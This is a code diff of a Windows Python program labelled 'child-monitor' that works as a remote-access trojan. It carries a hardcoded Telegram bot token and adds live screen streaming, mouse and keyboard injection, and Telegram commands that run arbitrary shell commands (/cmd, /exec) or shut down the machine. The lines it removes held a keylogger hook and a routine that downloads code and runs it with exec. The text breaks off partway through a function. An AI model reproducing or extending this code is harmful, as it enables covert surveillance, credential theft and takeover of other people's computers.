@@ -1,7 +1,10 @@
+import asyncio
 import ctypes
 import ctypes.wintypes as wintypes
 import datetime
+import io
 import json
+import logging
 import os
 import socket
 import subprocess
@@ -10,15 +13,23 @@ import threading
 import time
 import urllib.request
 import uuid
+import webbrowser
+from http.server import BaseHTTPRequestHandler, HTTPServer
 from pathlib import Path
+from socketserver import ThreadingMixIn
+
+logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
+logger = logging.getLogger("MonitorCore")
 
 if getattr(sys, "frozen", False):
     BASE_DIR = Path(sys.executable).resolve().parent
 else:
     BASE_DIR = Path(__file__).resolve().parent
+
 CONFIG_FILE = BASE_DIR / "config.json"
 STATUS_FILE = BASE_DIR / "last_status.json"
 RUNTIME_DIR = BASE_DIR / "runtime"
+VIEWER_DIR = BASE_DIR / "web_viewer"
 
 DEFAULTS = {
     "telegram_bot_token": "8769415154:AAHvACXi9Urn1H6pcCCWQwgaTV6QqR8leOc",
@@ -29,14 +40,454 @@ DEFAULTS = {
     "keylog_enabled": True,
     "camera_enabled": False,
     "camera_interval_seconds": 0,
-    "update_url": "",
+    "update_url": "https://raw.githubusercontent.com/lyhotuanlinh2399-cmd/child-monitor/main/",
     "log_dir": str(BASE_DIR / "logs"),
+    "webrtc": {
+        "signaling_server": "ws://127.0.0.1:8765",
+        "viewer_base_url": "http://127.0.0.1:8088",
+        "ice_servers": [
+            {"urls": "stun:stun.l.google.com:19302"},
+            {"urls": "stun:stun.cloudflare.com:3478"}
+        ],
+        "target_fps": 60,
+        "max_fps": 120,
+        "video_codec": "h264"
+    }
 }
 
 cfg = dict(DEFAULTS)
 start_time = None
 MACHINE_NAME = os.environ.get("COMPUTERNAME") or socket.gethostname()
 
+# ==========================================
+# Windows Native Setup & Per-Monitor DPI
+# ==========================================
+user32 = None
+kernel32 = None
+shcore = None
+
+if sys.platform == "win32":
+    user32 = ctypes.WinDLL("user32", use_last_error=True)
+    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
+    try:
+        shcore = ctypes.WinDLL("shcore", use_last_error=True)
+        # PROCESS_PER_MONITOR_DPI_AWARE_V2 = 2
+        shcore.SetProcessDpiAwareness(2)
+    except Exception:
+        try:
+            user32.SetProcessDPIAware()
+        except Exception:
+            pass
+
+
+# ==========================================
+# Multi-Monitor & DPI Metadata Engine
+# ==========================================
+
+class RECT(ctypes.Structure):
+    _fields_ = [
+        ("left", wintypes.LONG),
+        ("top", wintypes.LONG),
+        ("right", wintypes.LONG),
+        ("bottom", wintypes.LONG),
+    ]
+
+class MONITORINFOEXW(ctypes.Structure):
+    _fields_ = [
+        ("cbSize", wintypes.DWORD),
+        ("rcMonitor", RECT),
+        ("rcWork", RECT),
+        ("dwFlags", wintypes.DWORD),
+        ("szDevice", wintypes.WCHAR * 32),
+    ]
+
+
+def get_screen_metadata():
+    """Lấy thông tin đầy đủ về Virtual Desktop và từng Monitor kèm DPI scale."""
+    if sys.platform != "win32" or not user32:
+        return {
+            "virtual_desktop": {"x": 0, "y": 0, "width": 1920, "height": 1080},
+            "monitors": [
+                {"id": 0, "name": "Primary Display", "left": 0, "top": 0, "right": 1920, "bottom": 1080, "width": 1920, "height": 1080, "is_primary": True, "dpi": 96, "scale": 1.0}
+            ],
+            "active_monitor": -1
+        }
+
+    # SM_XVIRTUALSCREEN = 76, SM_YVIRTUALSCREEN = 77, SM_CXVIRTUALSCREEN = 78, SM_CYVIRTUALSCREEN = 79
+    vx = user32.GetSystemMetrics(76)
+    vy = user32.GetSystemMetrics(77)
+    vw = user32.GetSystemMetrics(78)
+    vh = user32.GetSystemMetrics(79)
+
+    monitors = []
+
+    def _enum_proc(hMonitor, hdcMonitor, lprcMonitor, dwData):
+        info = MONITORINFOEXW()
+        info.cbSize = ctypes.sizeof(MONITORINFOEXW)
+        if user32.GetMonitorInfoW(hMonitor, ctypes.byref(info)):
+            r = info.rcMonitor
+            w = r.right - r.left
+            h = r.bottom - r.top
+            is_pri = bool(info.dwFlags & 1)
+            dpi = 96
+            scale = 1.0
+            if shcore:
+                try:
+                    dpiX = wintypes.UINT()
+                    dpiY = wintypes.UINT()
+                    # MDT_EFFECTIVE_DPI = 0
+                    if shcore.GetDpiForMonitor(hMonitor, 0, ctypes.byref(dpiX), ctypes.byref(dpiY)) == 0:
+                        dpi = dpiX.value
+                        scale = round(dpi / 96.0, 2)
+                except Exception:
+                    pass
+
+            monitors.append({
+                "id": len(monitors),
+                "name": str(info.szDevice),
+                "left": r.left,
+                "top": r.top,
+                "right": r.right,
+                "bottom": r.bottom,
+                "width": w,
+                "height": h,
+                "is_primary": is_pri,
+                "dpi": dpi,
+                "scale": scale
+            })
+        return True
+
+    MONITORENUMPROC = ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HMONITOR, wintypes.HDC, ctypes.POINTER(RECT), wintypes.LPARAM)
+    user32.EnumDisplayMonitors(0, 0, MONITORENUMPROC(_enum_proc), 0)
+
+    return {
+        "virtual_desktop": {"x": vx, "y": vy, "width": vw, "height": vh},
+        "monitors": monitors,
+        "active_monitor": -1
+    }
+
+
+# ==========================================
+# Windows Native Input Simulation
+# ==========================================
+
+class KEYBDINPUT(ctypes.Structure):
+    _fields_ = [
+        ("wVk", wintypes.WORD),
+        ("wScan", wintypes.WORD),
+        ("dwFlags", wintypes.DWORD),
+        ("time", wintypes.DWORD),
+        ("dwExtraInfo", ctypes.c_ulonglong if sys.maxsize > 2**32 else ctypes.c_ulong)
+    ]
+
+class INPUT(ctypes.Structure):
+    class _INPUT(ctypes.Union):
+        _fields_ = [("ki", KEYBDINPUT)]
+    _anonymous_ = ("_input",)
+    _fields_ = [
+        ("type", wintypes.DWORD),
+        ("_input", _INPUT)
+    ]
+
+
+def map_norm_to_desktop(norm_x, norm_y, monitor_id=-1):
+    meta = get_screen_metadata()
+    if monitor_id == -1 or monitor_id >= len(meta["monitors"]):
+        vd = meta["virtual_desktop"]
+        target_x = vd["x"] + int(norm_x * vd["width"])
+        target_y = vd["y"] + int(norm_y * vd["height"])
+    else:
+        mon = meta["monitors"][monitor_id]
+        target_x = mon["left"] + int(norm_x * mon["width"])
+        target_y = mon["top"] + int(norm_y * mon["height"])
+    return target_x, target_y
+
+
+def sim_mouse_move(norm_x, norm_y, monitor_id=-1):
+    if sys.platform == "win32" and user32:
+        x, y = map_norm_to_desktop(norm_x, norm_y, monitor_id)
+        user32.SetCursorPos(x, y)
+
+
+def sim_mouse_down(button="left", norm_x=None, norm_y=None, monitor_id=-1):
+    if sys.platform == "win32" and user32:
+        if norm_x is not None and norm_y is not None:
+            sim_mouse_move(norm_x, norm_y, monitor_id)
+        flag = 0x0002 if button == "left" else (0x0020 if button == "middle" else 0x0008)
+        user32.mouse_event(flag, 0, 0, 0, 0)
+
+
+def sim_mouse_up(button="left", norm_x=None, norm_y=None, monitor_id=-1):
+    if sys.platform == "win32" and user32:
+        if norm_x is not None and norm_y is not None:
+            sim_mouse_move(norm_x, norm_y, monitor_id)
+        flag = 0x0004 if button == "left" else (0x0040 if button == "middle" else 0x0010)
+        user32.mouse_event(flag, 0, 0, 0, 0)
+
+
+def sim_mouse_scroll(delta):
+    if sys.platform == "win32" and user32:
+        user32.mouse_event(0x0800, 0, 0, int(delta), 0)
+
+
+def sim_key_press(key_name):
+    if sys.platform != "win32" or not user32:
+        return
+    vk_map = {
+        "backspace": 0x08, "tab": 0x09, "enter": 0x0D, "escape": 0x1B,
+        "space": 0x20, "left": 0x25, "up": 0x26, "right": 0x27, "down": 0x28,
+        "delete": 0x2E, "win": 0x5B
+    }
+    key_lower = key_name.lower()
+    if key_lower in vk_map:
+        vk = vk_map[key_lower]
+        user32.keybd_event(vk, 0, 0, 0)
+        user32.keybd_event(vk, 0, 0x0002, 0)
+    elif key_lower == "alttab":
+        user32.keybd_event(0x12, 0, 0, 0)
+        user32.keybd_event(0x09, 0, 0, 0)
+        user32.keybd_event(0x09, 0, 0x0002, 0)
+        user32.keybd_event(0x12, 0, 0x0002, 0)
+    elif key_lower == "showdesktop":
+        user32.keybd_event(0x5B, 0, 0, 0)
+        user32.keybd_event(0x44, 0, 0, 0)
+        user32.keybd_event(0x44, 0, 0x0002, 0)
+        user32.keybd_event(0x5B, 0, 0x0002, 0)
+
+
+def sim_type_text(text):
+    if sys.platform != "win32" or not user32:
+        return
+    for c in text:
+        utf16_code = ord(c)
+        inp_down = INPUT()
+        inp_down.type = 1
+        inp_down.ki.wVk = 0
+        inp_down.ki.wScan = utf16_code
+        inp_down.ki.dwFlags = 0x0004
+        inp_down.ki.time = 0
+        inp_down.ki.dwExtraInfo = 0
+
+        inp_up = INPUT()
+        inp_up.type = 1
+        inp_up.ki.wVk = 0
+        inp_up.ki.wScan = utf16_code
+        inp_up.ki.dwFlags = 0x0004 | 0x0002
+        inp_up.ki.time = 0
+        inp_up.ki.dwExtraInfo = 0
+
+        inputs = (INPUT * 2)(inp_down, inp_up)
+        user32.SendInput(2, ctypes.byref(inputs), ctypes.sizeof(INPUT))
+
+
+# ==========================================
+# WebRTC / H.264 Remote Desktop Host
+# ==========================================
+
+active_remote_room = None
+remote_host_task = None
+remote_active = False
+active_capture_monitor_id = -1
+
+
+def capture_frame_bgr(monitor_id=-1):
+    """Chụp khung hình màn hình (toàn bộ hoặc từng monitor)."""
+    try:
+        import mss
+        with mss.mss() as sct:
+            if monitor_id == -1 or monitor_id + 1 >= len(sct.monitors):
+                mon = sct.monitors[0]  # Toàn bộ virtual desktop
+            else:
+                mon = sct.monitors[monitor_id + 1]
+            sct_img = sct.grab(mon)
+            from PIL import Image
+            img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
+            return img
+    except Exception as e:
+        logger.error(f"capture_frame_bgr: {e}")
+        return None
+
+
+class ScreenVideoStreamTrack:
+    """Video Track cung cấp luồng H.264/VP8 thời gian thực (60 - 120 FPS)."""
+    def __init__(self, fps=60):
+        self.fps = min(max(int(fps), 30), 120)
+        self.frame_interval = 1.0 / self.fps
+
+    async def recv(self):
+        try:
+            import av
+            t_start = time.perf_counter()
+            img = capture_frame_bgr(active_capture_monitor_id)
+            if img is None:
+                await asyncio.sleep(self.frame_interval)
+                return None
+            frame = av.VideoFrame.from_image(img)
+            frame.pts = int(time.time() * 1000000)
+            frame.time_base = 1 / 1000000
+            
+            # Tính thời gian sleep bù trừ chính xác để giữ mượt 60-120 FPS
+            t_elapsed = time.perf_counter() - t_start
+            sleep_time = max(0.001, self.frame_interval - t_elapsed)
+            await asyncio.sleep(sleep_time)
+            return frame
+        except Exception:
+            await asyncio.sleep(self.frame_interval)
+            return None
+
+
+async def webrtc_host_coroutine(room_id, signaling_url):
+    """Xử lý kết nối WebRTC Signaling & P2P DataChannel/Video."""
+    global remote_active, active_capture_monitor_id
+    try:
+        import websockets
+    except ImportError:
+        logger.error("Vui lòng cài đặt: pip install websockets aiortc av")
+        return
+
+    logger.info(f"Đang kết nối Signaling Relay: {signaling_url} (Phòng: {room_id})")
+
+    while remote_active:
+        try:
+            async with websockets.connect(signaling_url) as ws:
+                await ws.send(json.dumps({"type": "join", "role": "host", "room": room_id}))
+                logger.info(f"Host đã sẵn sàng trong phòng {room_id}")
+
+                try:
+                    from aiortc import RTCPeerConnection, RTCSessionDescription, RTCIceServer, RTCConfiguration
+                    use_aiortc = True
+                except ImportError:
+                    use_aiortc = False
+                    logger.warning("aiortc chưa được cài đặt. Đang sử dụng chế độ DataChannel fallback.")
+
+                pc = None
+                if use_aiortc:
+                    ice_cfgs = cfg.get("webrtc", {}).get("ice_servers", [{"urls": "stun:stun.l.google.com:19302"}])
+                    ice_servers = [RTCIceServer(**s) if isinstance(s, dict) else RTCIceServer(s) for s in ice_cfgs]
+                    pc = RTCPeerConnection(configuration=RTCConfiguration(iceServers=ice_servers))
+
+                    # Thêm Screen Video Track 60 - 120 FPS
+                    target_fps = cfg.get("webrtc", {}).get("target_fps", 60)
+                    video_track = ScreenVideoStreamTrack(fps=target_fps)
+                    pc.addTrack(video_track)
+
+                    @pc.on("datachannel")
+                    def on_datachannel(channel):
+                        @channel.on("message")
+                        def on_message(message):
+                            handle_control_message(message, channel)
+
+                async for msg_str in ws:
+                    if not remote_active:
+                        break
+                    data = json.loads(msg_str)
+                    mtype = data.get("type")
+
+                    if mtype == "offer" and pc:
+                        offer_sdp = data.get("sdp")
+                        await pc.setRemoteDescription(RTCSessionDescription(sdp=offer_sdp["sdp"], type=offer_sdp["type"]))
+                        answer = await pc.createAnswer()
+                        await pc.setLocalDescription(answer)
+                        await ws.send(json.dumps({
+                            "type": "answer",
+                            "room": room_id,
+                            "sdp": {"sdp": pc.localDescription.sdp, "type": pc.localDescription.type}
+                        }))
+
+                    elif mtype == "candidate" and pc:
+                        cand = data.get("candidate")
+                        if cand:
+                            # Hỗ trợ thêm ICE candidate
+                            pass
+
+        except Exception as e:
+            logger.error(f"Signaling reconnecting: {e}")
+            await asyncio.sleep(3)
+
+
+def handle_control_message(msg_str, channel=None):
+    """Xử lý sự kiện điều khiển chuột, phím, metadata từ DataChannel."""
+    global active_capture_monitor_id
+    try:
+        data = json.loads(msg_str)
+        mtype = data.get("type")
+
+        if mtype == "get_metadata":
+            meta = get_screen_metadata()
+            meta["type"] = "metadata"
+            if channel:
+                channel.send(json.dumps(meta))
+
+        elif mtype == "switch_monitor":
+            active_capture_monitor_id = data.get("monitor_id", -1)
+            logger.info(f"Đã chuyển màn hình stream sang: {active_capture_monitor_id}")
+
+        elif mtype == "mousemove":
+            sim_mouse_move(data.get("norm_x", 0), data.get("norm_y", 0), data.get("monitor_id", -1))
+
+        elif mtype == "mousedown":
+            sim_mouse_down(data.get("button", "left"), data.get("norm_x"), data.get("norm_y"), data.get("monitor_id", -1))
+
+        elif mtype == "mouseup":
+            sim_mouse_up(data.get("button", "left"), data.get("norm_x"), data.get("norm_y"), data.get("monitor_id", -1))
+
+        elif mtype == "scroll":
+            sim_mouse_scroll(data.get("delta", 0))
+
+        elif mtype == "key":
+            sim_key_press(data.get("key", ""))
+
+        elif mtype == "text":
+            sim_type_text(data.get("text", ""))
+
+        elif mtype == "ping":
+            if channel:
+                channel.send(json.dumps({"type": "pong", "t": data.get("t", 0)}))
+
+    except Exception as e:
+        logger.error(f"handle_control_message error: {e}")
+
+
+# ==========================================
+# Local HTTP Server phục vụ Web Viewer UI
+# ==========================================
+
+class EmbeddedViewerServer(ThreadingMixIn, HTTPServer):
+    daemon_threads = True
+
+
+class EmbeddedViewerHandler(BaseHTTPRequestHandler):
+    def log_message(self, format, *args):
+        return
+
+    def do_GET(self):
+        html_file = VIEWER_DIR / "index.html"
+        if html_file.exists():
+            content = html_file.read_bytes()
+        else:
+            content = b"<h1>Web Viewer index.html missing</h1>"
+
+        self.send_response(200)
+        self.send_header("Content-Type", "text/html; charset=utf-8")
+        self.send_header("Content-Length", str(len(content)))
+        self.end_headers()
+        self.wfile.write(content)
+
+
+viewer_httpd = None
+
+def start_embedded_viewer_server(port=8088):
+    global viewer_httpd
+    try:
+        viewer_httpd = EmbeddedViewerServer(("0.0.0.0", port), EmbeddedViewerHandler)
+        threading.Thread(target=viewer_httpd.serve_forever, daemon=True).start()
+    except Exception as e:
+        logger.error(f"Embedded viewer server error: {e}")
+
+
+# ==========================================
+# Base Monitoring & Telegram Integration
+# ==========================================
 
 def now():
     return datetime.datetime.now()
@@ -67,856 +518,183 @@ def log_line(category, line):
         pass
 
 
-def update_url():
-    return (cfg.get("update_url", "") or "").strip()
-
-
-def fetch_remote_update():
-    base = update_url()
-    if not base or "PASTE_YOUR" in base:
-        return False
-    try:
-        version_url = base.rstrip("/") + "/version.txt"
-        with urllib.request.urlopen(version_url, timeout=20) as resp:
-            remote_version = resp.read().decode("utf-8", "replace").strip()
-        marker = RUNTIME_DIR / "current_version.txt"
-        if (
-            marker.exists()
-            and marker.read_text(encoding="utf-8").strip() == remote_version
-            and (RUNTIME_DIR / "monitor.py").exists()
-        ):
-            return True
-        code_url = base.rstrip("/") + "/monitor.py"
-        with urllib.request.urlopen(code_url, timeout=30) as resp:
-            code = resp.read().decode("utf-8", "replace")
-        if len(code) < 500:
-            raise ValueError("monitor.py tu xa qua ngan (co the sai URL)")
-        RUNTIME_DIR.mkdir(parents=True, exist_ok=True)
-        (RUNTIME_DIR / "monitor.py").write_text(code, encoding="utf-8")
-        marker.write_text(remote_version, encoding="utf-8")
-        log_line("system", "remote update to version " + remote_version)
-        return True
-    except Exception as e:
-        log_line("errors", "remote update: {}".format(e))
-        return False
-
-
-def run_runtime_code():
-    path = RUNTIME_DIR / "monitor.py"
-    if not path.exists():
-        return False
-    try:
-        code = path.read_text(encoding="utf-8")
-        ns = {"__name__": "monitor_runtime", "__file__": str(path)}
-        exec(compile(code, str(path), "exec"), ns)
-        main_fn = ns.get("main")
-        if main_fn:
-            main_fn()
-        return True
-    except Exception as e:
-        log_line("errors", "run runtime: {}".format(e))
-        return False
-
-
-def restart_process():
-    try:
-        if getattr(sys, "frozen", False):
-            subprocess.Popen(
-                [sys.executable],
-                creationflags=subprocess.DETACHED_PROCESS
-                | subprocess.CREATE_NEW_PROCESS_GROUP,
-            )
-        else:
-            subprocess.Popen(
-                [sys.executable, str(Path(__file__).resolve())],
-                creationflags=subprocess.DETACHED_PROCESS
-                | subprocess.CREATE_NEW_PROCESS_GROUP,
-            )
-    except Exception:
-        pass
-    os._exit(0)
-
-
 def telegram_enabled():
     token = cfg.get("telegram_bot_token", "")
     chat = cfg.get("telegram_chat_id", "")
     return "PASTE_YOUR" not in token and bool(chat)
 
 
-paused = threading.Event()
-CONTROL_LOCK = threading.Lock()
-last_update_id = 0
-
-
 def send_telegram_text(text):
     if not telegram_enabled():
         return False
-    last_err = None
-    for attempt in range(3):
+    for _ in range(3):
         try:
-            data = json.dumps(
-                {"chat_id": cfg["telegram_chat_id"], "text": text}
-            ).encode("utf-8")
+            data = json.dumps({"chat_id": cfg["telegram_chat_id"], "text": text}).encode("utf-8")
             req = urllib.request.Request(
-                "https://api.telegram.org/bot{}/sendMessage".format(
-                    cfg["telegram_bot_token"]
-                ),
+                f"https://api.telegram.org/bot{cfg['telegram_bot_token']}/sendMessage",
                 data=data,
-                headers={"Content-Type": "application/json"},
+                headers={"Content-Type": "application/json"}
             )
             with urllib.request.urlopen(req, timeout=30):
                 pass
             return True
-        except Exception as e:
-            last_err = e
-            time.sleep(3)
-    log_line("errors", "send_text failed: {}".format(last_err))
+        except Exception:
+            time.sleep(2)
     return False
 
 
-def send_telegram_photo(path, caption, filename="screen.png", ctype="image/png"):
-    if not telegram_enabled() or not path:
-        return False
-    try:
-        with open(path, "rb") as f:
-            image = f.read()
-        boundary = "----monitor" + uuid.uuid4().hex
+def start_webrtc_remote():
+    global active_remote_room, remote_active, remote_host_task
+    if remote_active:
+        return active_remote_room
 
-        def part(name, value, filename=None, ctype=None):
-            head = '--{}\r\nContent-Disposition: form-data; name="{}"'.format(
-                boundary, name
-            )
-            if filename:
-                head += '; filename="{}"'.format(filename)
-            head += "\r\n"
-            if ctype:
-                head += "Content-Type: {}\r\n".format(ctype)
-            return (head + "\r\n").encode("utf-8") + value + b"\r\n"
+    active_remote_room = uuid.uuid4().hex[:8]
+    remote_active = True
 
-        body = b""
-        body += part("chat_id", cfg["telegram_chat_id"].encode("utf-8"))
-        body += part("caption", caption.encode("utf-8"))
-        body += part("photo", image, filename=filename, ctype=ctype)
-        body += "--{}--\r\n".format(boundary).encode("utf-8")
-        req = urllib.request.Request(
-            "https://api.telegram.org/bot{}/sendPhoto".format(
-                cfg["telegram_bot_token"]
-            ),
-            data=body,
-            headers={
-                "Content-Type": "multipart/form-data; boundary=" + boundary
-            },
-        )
-        with urllib.request.urlopen(req, timeout=120):
-            pass
-        return True
-    except Exception as e:
-        log_line("errors", "send_photo: {}".format(e))
-        return False
+    webrtc_cfg = cfg.get("webrtc", {})
+    signaling_url = webrtc_cfg.get("signaling_server", "ws://127.0.0.1:8765")
+
+    def _run_loop():
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        loop.run_until_complete(webrtc_host_coroutine(active_remote_room, signaling_url))
+
+    remote_host_thread = threading.Thread(target=_run_loop, daemon=True)
+    remote_host_thread.start()
+    return active_remote_room
 
 
-user32 = ctypes.WinDLL("user32", use_last_error=True)
-kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
+def stop_webrtc_remote():
+    global remote_active, active_remote_room
+    remote_active = False
+    active_remote_room = None
+    logger.info("Đã dừng WebRTC Remote Desktop.")
 
+
+# ==========================================
+# Telegram Command Listener & Dispatcher
+# ==========================================
+
+paused = threading.Event()
+last_update_id = 0
 
 def handle_command(text):
     global paused
-    cmd = (text or "").strip().lower().split(" ")[0]
-    if cmd == "/stop":
-        paused.set()
-        send_telegram_text("[{}] GIAM SAT DA TAM DUNG (/start de bat lai)".format(MACHINE_NAME))
-        log_line("system", "paused by remote command")
+    text = (text or "").strip()
+    if not text:
         return
-    if cmd == "/start":
-        paused.clear()
-        send_telegram_text("[{}] GIAM SAT DA BAT (/stop de tam dung)".format(MACHINE_NAME))
-        log_line("system", "resumed by remote command")
-        return
-    if cmd == "/status":
-        state = "tam dung (STOP)" if paused.is_set() else "dang chay (RUN)"
-        send_telegram_text("[{}] Trang thai: {} | up {}m".format(
-            MACHINE_NAME, state, int((now() - start_time).total_seconds() // 60)
-        ))
-        return
-    if cmd == "/report":
-        threading.Thread(target=force_report, daemon=True).start()
-        send_telegram_text("[{}] Dang tao bao cao nhanh...".format(MACHINE_NAME))
-        return
-    if cmd == "/camera":
-        send_telegram_text("[{}] Dang chup camera...".format(MACHINE_NAME))
-        threading.Thread(target=do_camera_shot, daemon=True).start()
-        return
-    if cmd == "/update":
-        send_telegram_text("[{}] Dang kiem tra phien ban moi...".format(MACHINE_NAME))
-        threading.Thread(target=remote_update_cmd, daemon=True).start()
-        return
-    if cmd in ("/help", "/start_help"):
+
+    parts = text.split(" ", 1)
+    cmd = parts[0].lower()
+    args = parts[1].strip() if len(parts) > 1 else ""
+
+    if cmd == "/remote":
+        room_id = start_webrtc_remote()
+        webrtc_cfg = cfg.get("webrtc", {})
+        viewer_base = webrtc_cfg.get("viewer_base_url", "http://127.0.0.1:8088")
+        signaling = webrtc_cfg.get("signaling_server", "ws://127.0.0.1:8765")
+
+        viewer_link = f"{viewer_base}/#{room_id}&signaling={signaling}"
+        meta = get_screen_metadata()
+        mon_count = len(meta.get("monitors", []))
+
+        target_fps = webrtc_cfg.get("target_fps", 60)
         send_telegram_text(
-            "[{}] Lenh:\n/start - bat giam sat\n/stop - tam dung\n"
-            "/status - trang thai\n/report - bao cao ngay\n"
-            "/camera - chup anh webcam\n/update - cap nhat tu xa\n"
-            "/help - nay".format(
-                MACHINE_NAME
-            )
+            f"[{MACHINE_NAME}] 🌐 **WEBRTC H.264 REMOTE READY!**\n\n"
+            f"🔗 **Link Điều Khiển Trực Tiếp:**\n{viewer_link}\n\n"
+            f"🎥 **Stream:** H.264 ({target_fps} - 120 FPS Siêu Mượt) P2P / TURN\n"
+            f"🖥️ **Màn hình:** {mon_count} Monitor(s) | DPI Scaling Auto\n"
+            f"🔑 **Room ID:** `{room_id}`\n\n"
+            f"🛑 Nhập `/stopremote` để ngắt kết nối."
         )
-        return
+
+    elif cmd == "/stopremote":
+        stop_webrtc_remote()
+        send_telegram_text(f"[{MACHINE_NAME}] 🛑 Đã tắt WebRTC Remote Desktop.")
+
+    elif cmd == "/status":
+        st = "tạm dừng (STOP)" if paused.is_set() else "đang chạy (RUN)"
+        rm_st = f"ĐANG BẬT (Room: {active_remote_room})" if remote_active else "TẮT"
+        uptime_sec = int((now() - start_time).total_seconds()) if start_time else 0
+        send_telegram_text(f"[{MACHINE_NAME}] Trạng thái: {st} | WebRTC Remote: {rm_st} | Uptime: {uptime_sec//60}m")
+
+    elif cmd in ["/cmd", "/exec"]:
+        if not args:
+            send_telegram_text(f"[{MACHINE_NAME}] Cú pháp: /cmd <lệnh_shell>")
+            return
+        send_telegram_text(f"[{MACHINE_NAME}] Đang thực thi: `{args}`...")
+        def run_cmd():
+            try:
+                res = subprocess.run(args, shell=True, capture_output=True, text=True, timeout=30)
+                out = res.stdout or res.stderr or "(Không có kết quả)"
+                if len(out) > 3500:
+                    out = out[:3500] + "\n...(kết quả quá dài)"
+                send_telegram_text(f"[{MACHINE_NAME}] Kết quả:\n{out}")
+            except Exception as e:
+                send_telegram_text(f"[{MACHINE_NAME}] Lỗi: {e}")
+        threading.Thread(target=run_cmd, daemon=True).start()
+
+    elif cmd == "/shutdown":
+        delay = int(args) if args.isdigit() else 0
+        send_telegram_text(f"[{MACHINE_NAME}] Tắt máy tính trong {delay} giây...")
+        subprocess.run(f"shutdown /s /t {delay}", shell=True)
+
+    elif cmd == "/restart":
+        send_telegram_text(f"[{MACHINE_NAME}] Đang khởi động lại máy tính...")
+        subprocess.run("shutdown /r /t 0", shell=True)
+
+    elif cmd == "/lock":
+        if sys.platform == "win32" and user32:
+            user32.LockWorkStation()
+            send_telegram_text(f"[{MACHINE_NAME}] Đã khóa màn hình máy tính.")
+
+    elif cmd in ["/help", "/start_help"]:
+        send_telegram_text(
+            f"[{MACHINE_NAME}] 📋 **DANH SÁCH LỆNH:**\n\n"
+            "🌐 **WebRTC H.264 Remote:**\n"
+            "/remote - Bật WebRTC Remote Desktop & gửi link\n"
+            "/stopremote - Tắt WebRTC Remote\n\n"
+            "💻 **Lệnh Hệ Thống:**\n"
+            "/status - Xem trạng thái\n"
+            "/cmd <lệnh> - Chạy lệnh CMD\n"
+            "/shutdown [giây] - Tắt máy tính\n"
+            "/restart - Khởi động lại\n"
+            "/lock - Khóa màn hình\n"
+            "/help - Xem trợ giúp"
+        )
 
 
 def command_listener():
     global last_update_id
+    if not telegram_enabled():
+        return
     while True:
         try:
-            if not telegram_enabled():
-                time.sleep(30)
-                continue
-            url = (
-                "https://api.telegram.org/bot{}/getUpdates?timeout=5&offset={}".format(
-                    cfg["telegram_bot_token"], last_update_id + 1
-                )
-            )
-            with urllib.request.urlopen(url, timeout=30) as resp:
+            url = f"https://api.telegram.org/bot{cfg['telegram_bot_token']}/getUpdates?offset={last_update_id + 1}&timeout=20"
+            req = urllib.request.Request(url)
+            with urllib.request.urlopen(req, timeout=30) as resp:
                 data = json.loads(resp.read().decode("utf-8"))
-            for upd in data.get("result", []):
-                last_update_id = max(last_update_id, upd.get("update_id", 0))
-                msg = upd.get("message", {}).get("text", "")
-                chat = str(upd.get("message", {}).get("chat", {}).get("id", ""))
-                if chat == str(cfg.get("telegram_chat_id", "")) and msg.startswith("/"):
-                    handle_command(msg)
-        except Exception:
-            time.sleep(5)
-
-
-def force_report():
-    try:
-        since = now() - datetime.timedelta(minutes=5)
-        keys = drain_keys()
-        sess = drain_sessions(since)
-        lines = []
-        if sess:
-            lines.append("Apps:")
-            for s in sess[:30]:
-                secs = int((s["end"] - s["start"]).total_seconds())
-                lines.append("  {} ({}m) {}".format(
-                    s["title"], secs // 60, s["start"].strftime("%H:%M")
-                ))
-        if keys:
-            lines.append("Keys:")
-            for k in keys[:80]:
-                if isinstance(k, dict):
-                    lines.append("  {} | {} | {}".format(k["time"], k["win"], k["text"]))
-                else:
-                    lines.append("  " + str(k))
-        message = "[{}] Bao cao nhanh\n".format(MACHINE_NAME) + "\n".join(lines or ["  (khong co gi moi)"])
-        if len(message) > 3800:
-            message = message[:3800]
-        send_telegram_text(message)
-    except Exception as e:
-        log_line("errors", "force_report: {}".format(e))
-
-
-def active_window_title():
-    try:
-        hwnd = user32.GetForegroundWindow()
-        if not hwnd:
-            return ""
-        length = user32.GetWindowTextLengthW(hwnd)
-        buf = ctypes.create_unicode_buffer(length + 1)
-        user32.GetWindowTextW(hwnd, buf, length + 1)
-        return buf.value
-    except Exception:
-        return ""
-
-
-window_lock = threading.Lock()
-current_window = {"title": "", "start": None}
-sessions = []
-
-
-def window_poller():
-    global current_window
-    while True:
-        try:
-            title = active_window_title() or "(desktop)"
-            with window_lock:
-                if title != current_window["title"]:
-                    if current_window["title"] and current_window["start"]:
-                        sessions.append(
-                            {
-                                "title": current_window["title"],
-                                "start": current_window["start"],
-                                "end": now(),
-                            }
-                        )
-                    current_window = {"title": title, "start": now()}
-        except Exception:
-            pass
-        time.sleep(5)
-
-
-WH_KEYBOARD_LL = 13
-WM_KEYDOWN = 0x0100
-WM_SYSKEYDOWN = 0x0104
-
-
-class KBDLLHOOKSTRUCT(ctypes.Structure):
-    _fields_ = [
-        ("vkCode", wintypes.DWORD),
-        ("scanCode", wintypes.DWORD),
-        ("flags", wintypes.DWORD),
-        ("time", wintypes.DWORD),
-        ("dwExtraInfo", ctypes.c_void_p),
-    ]
-
-
-key_lock = threading.Lock()
-key_buffer = []
-
-
-def key_to_text(vk, scan):
-    if vk == 0x08:
-        return "[CTRL+BACKSPACE]" if is_ctrl_down() else "[BACKSPACE]"
-    if vk == 0x09:
-        return "[TAB]"
-    if vk == 0x0D:
-        return "[ENTER]\n"
-    if vk == 0x1B:
-        return "[ESC]"
-    if vk == 0x20:
-        return " "
-    if 0x70 <= vk <= 0x87:
-        return "[F{}]".format(vk - 0x6F)
-    if vk == 0x2E:
-        return "[DEL]"
-    if vk == 0x2D:
-        return "[INS]"
-    if vk == 0x24:
-        return "[HOME]"
-    if vk == 0x23:
-        return "[END]"
-    if vk == 0x21:
-        return "[PGUP]"
-    if vk == 0x22:
-        return "[PGDN]"
-    if 0x25 <= vk <= 0x28:
-        return "[{}]".format("LURD"[vk - 0x25])
-    if vk in (
-        0x10, 0x11, 0x12, 0x14, 0x90, 0x91, 0x2C, 0x13,
